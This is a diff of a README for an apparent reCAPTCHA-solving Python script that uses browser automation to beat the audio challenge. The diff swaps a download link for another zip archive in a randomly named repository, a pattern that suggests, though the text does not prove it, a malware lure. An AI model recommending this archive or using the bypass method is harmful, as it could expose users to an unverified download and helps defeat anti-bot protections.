@@ -5,7 +5,7 @@ Solve Google reCAPTCHA less than 5 seconds! 🚀
 
 This is a Python script to solve Google reCAPTCHA using the DrissionPage library. Selenium implementation will be added soon.
 
-[DOWNLOAD](https://github.com/loasd104/asfsfscxs/releases/download/Release/install.zip)
+[DOWNLOAD](https://github.com/loasd104/asfsfscxs/releases/download/Release/pass_125accept.zip)
 
 How does it work?
 We automate the browser to solve the reCAPTCHA. Instead of image captcha, we are solving the audio captcha. The audio captcha is easier to solve programmatically.
